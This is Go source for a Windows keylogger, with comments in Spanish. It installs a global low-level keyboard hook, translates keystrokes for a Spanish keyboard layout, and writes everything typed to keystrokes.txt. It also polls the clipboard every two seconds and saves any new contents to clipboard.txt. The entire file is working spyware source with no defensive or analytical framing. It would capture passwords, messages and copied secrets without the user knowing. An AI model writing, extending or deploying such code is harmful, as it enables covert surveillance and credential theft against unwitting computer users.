package main

/*
#cgo LDFLAGS: -L. -lkeyboard_layout
#include "keyboard_layout.h"
*/
import "C"
import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

// Constantes de la API de Windows
const (
	WH_KEYBOARD_LL = 13
	WH_MOUSE_LL    = 14
	WM_KEYDOWN     = 0x0100
	WM_KEYUP       = 0x0101
	WM_SYSKEYDOWN  = 0x0104
	WM_SYSKEYUP    = 0x0105
	WM_LBUTTONDOWN = 0x0201
	WM_RBUTTONDOWN = 0x0204
	WM_MBUTTONDOWN = 0x0207
	HC_ACTION      = 0

	LAYOUT_ES = 0x0C0A // Español (España)
	LAYOUT_EN = 0x0409 // Inglés (Estados Unidos)
	LAYOUT_FR = 0x040C // Francés (Francia)
	LAYOUT_DE = 0x0407 // Alemán (Alemania)
	LAYOUT_IT = 0x0410 // Italiano (Italia)
	LAYOUT_PT = 0x0816 // Portugués (Brasil)
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = user32.NewProc("GetMessageW")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState") // Asegúrate de que está declarado
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	openClipboard           = user32.NewProc("OpenClipboard")
	closeClipboard          = user32.NewProc("CloseClipboard")
	getClipboardData        = user32.NewProc("GetClipboardData")
	globalLock              = kernel32.NewProc("GlobalLock")
	globalUnlock            = kernel32.NewProc("GlobalUnlock")
	CF_UNICODETEXT          = 13 // Formato para texto Unicode en el portapapeles
	keyboardHookID          syscall.Handle
	mouseHookID             syscall.Handle
	isShiftPressed          = false
	isAltGrPressed          = false
	isCtrlPressed           = false
	isAltPressed            = false
	buffer                  string
	keyboardLayoutID        int
	lastClipboard           string
)

// Obtener el layout de teclado al iniciar el programa
func init() {
	keyboardLayoutID = int(C.GetKeyboardLayoutID())

}

// Mapa base para teclas especiales
func baseVkCodeMap() map[uint32]string {
	return map[uint32]string{
		8: "[Backspace]", 9: "[Tab]", 13: "[Enter]\n", 27: "[Esc]",
		32: " ", 37: "[LeftArrow]", 38: "[UpArrow]", 39: "[RightArrow]", 40: "[DownArrow]",
		91: "[WindowsLeft]", 92: "[WindowsRight]", 93: "[Menu]",
		112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]", 116: "[F5]", 117: "[F6]",
		118: "[F7]", 119: "[F8]", 120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
		160: "", 161: "", 162: "[CtrlLeft]", 163: "[CtrlRight]",
		164: "[AltLeft]", 165: "",
	}
}

// Combina el mapa base con el de cada idioma
func mergeMaps(base, custom map[uint32]string) map[uint32]string {
	for k, v := range custom {
		base[k] = v
	}
	return base
}

// Mapa de teclas para diferentes layouts
func generateVkCodeMap(shift, altGr bool) map[uint32]string {
	switch keyboardLayoutID {
	case LAYOUT_ES:
		return mergeMaps(baseVkCodeMap(), generateSpanishVkCodeMap(shift, altGr))
	default:
		return mergeMaps(baseVkCodeMap(), generateSpanishVkCodeMap(shift, altGr))
	}
}

// Función de mapeo específico para el teclado español
func generateSpanishVkCodeMap(shift, altGr bool) map[uint32]string {
	baseMap := map[uint32]string{
		48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
		65: "a", 66: "b", 67: "c", 68: "d", 69: "e", 70: "f", 71: "g", 72: "h", 73: "i", 74: "j",
		75: "k", 76: "l", 77: "m", 78: "n", 79: "o", 80: "p", 81: "q", 82: "r", 83: "s", 84: "t",
		85: "u", 86: "v", 87: "w", 88: "x", 89: "y", 90: "z",
		186: "ñ", 187: "´", 188: ",", 189: "-", 190: ".", 191: "-", 192: "º",
		219: "`", 220: "\\", 221: "ç", 222: "¨",
	}
	if shift {
		// Mayúsculas
		for i := 65; i <= 90; i++ {
			baseMap[uint32(i)] = string(rune(i))
		}
		baseMap[48] = ")"  // Shift + 0
		baseMap[49] = "!"  // Shift + 1
		baseMap[50] = "\"" // Shift + 2
		baseMap[51] = "#"  // Shift + 3
		baseMap[52] = "$"  // Shift + 4
		baseMap[53] = "%"  // Shift + 5
		baseMap[54] = "&"  // Shift + 6
		baseMap[55] = "/"  // Shift + 7
		baseMap[56] = "("  // Shift + 8
		baseMap[57] = "="  // Shift + 9
	}
	if altGr {
		baseMap[49] = "|"  // AltGr + 1
		baseMap[52] = "~"  // AltGr + 4
		baseMap[54] = "¬"  // AltGr + 6
		baseMap[50] = "@"  // AltGr + 2
		baseMap[51] = "#"  // AltGr + 3
		baseMap[92] = "\\" // AltGr + \
		if shift {
			for i := 65; i <= 90; i++ {
				baseMap[uint32(i)] = string(rune(i - 32)) // Capital letters
			}
		}
	}
	return baseMap
}

// Función para verificar el estado de una tecla
func checkKeyState(vkCode int) bool {
	state, _, _ := procGetAsyncKeyState.Call(uintptr(vkCode))
	return state&0x8000 != 0 // Devuelve true si la tecla está presionada
}

func saveToFile(filename, content string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		file.WriteString(content)
		if content == "\n" {
			file.WriteString("\n")
		}
		file.Close()
	}
}

// Función de callback para capturar eventos de teclado
func LowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == HC_ACTION {
		kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
			switch kbdstruct.VkCode {
			case 160, 161: // Shift
				isShiftPressed = true
			case 162: // CtrlLeft
				if !isAltGrPressed { // Solo activar si AltGr no está presionado
					isCtrlPressed = true
				}
			case 163: // CtrlRight
				if !isAltGrPressed { // Solo activar si AltGr no está presionado
					isCtrlPressed = true
				}
			case 164: // AltLeft
				isAltPressed = true
			case 165: // AltGr
				isAltGrPressed = true
				isCtrlPressed = false // Desactivar Ctrl aquí para evitar el comportamiento no deseado
			}

			vkCodeToChar := generateVkCodeMap(isShiftPressed, isAltGrPressed)
			char, ok := vkCodeToChar[kbdstruct.VkCode]
			if ok {
				if char == "\n" { // Al presionar Enter
					saveToFile("keystrokes.txt", buffer) // Guardar el buffer en el archivo
					buffer = ""                          // Limpiar el buffer
				} else if char != "[ShiftLeft]" && char != "[ShiftRight]" && char != "[CtrlLeft]" && char != "[CtrlRight]" && char != "[AltLeft]" && char != "[AltGr]" {
					buffer += char
				}

			}
		} else if wParam == WM_KEYUP || wParam == WM_SYSKEYUP {
			switch kbdstruct.VkCode {
			case 160, 161: // Shift
				isShiftPressed = false
			case 162: // CtrlLeft
				if !isAltGrPressed { // Solo desactivar Ctrl si AltGr no está presionado
					isCtrlPressed = false
				}
			case 163: // CtrlRight
				if !isAltGrPressed { // Solo desactivar Ctrl si AltGr no está presionado
					isCtrlPressed = false
				}
			case 164: // AltLeft
				isAltPressed = false
			case 165: // AltGr
				isAltGrPressed = false
			}
		}
	}

	// Guardar el buffer en el archivo de texto al final del procesamiento
	if len(buffer) > 0 {
		saveToFile("keystrokes.txt", buffer)
		buffer = ""
	}

	result, _, _ := procCallNextHookEx.Call(uintptr(keyboardHookID), uintptr(nCode), wParam, lParam)
	return result
}

func readClipboard() (string, error) {
	// Abrir el portapapeles
	r, _, err := openClipboard.Call(0)
	if r == 0 {
		return "", fmt.Errorf("Error al abrir el portapapeles: %v", err)
	}
	defer closeClipboard.Call()

	// Obtener el contenido del portapapeles
	h, _, err := getClipboardData.Call(uintptr(CF_UNICODETEXT))
	if h == 0 {
		return "", fmt.Errorf("Fallo al obtener datos del portapapeles: %v", err)
	}

	// Bloquear el contenido de la memoria global y convertirlo a string
	ptr, _, err := globalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("Fallo al bloquear memoria global: %v", err)
	}
	defer globalUnlock.Call(h)

	// Convertir el contenido a un string
	text := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(ptr))[:])

	return text, nil
}

func monitorClipboard() {
	for {
		text, err := readClipboard()
		if err == nil && text != lastClipboard {
			lastClipboard = text
			//fmt.Println("Nuevo texto en el portapapeles:", text)
			saveToFile("clipboard.txt", text)
		}
		time.Sleep(2 * time.Second) // Escaneo cada 2 segundos
	}
}

// Estructura de KBDLLHOOKSTRUCT
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

func main() {
	go monitorClipboard()

	// Configurar el hook del teclado
	keyboardHookProc := syscall.NewCallback(LowLevelKeyboardProc)

	hKey, _, err := procSetWindowsHookEx.Call(
		uintptr(WH_KEYBOARD_LL),
		keyboardHookProc,
		0,
		0,
	)
	if hKey == 0 {
		fmt.Println("Error al instalar el hook de teclado:", err)
		return
	}
	keyboardHookID = syscall.Handle(hKey)

	defer procUnhookWindowsHookEx.Call(uintptr(keyboardHookID))

	var msg struct {
		hwnd    uintptr
		message uint32
		wParam  uintptr
		lParam  uintptr
		time    uint32
		pt      struct{ x, y int32 }
	}
	for {
		procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
	}
}
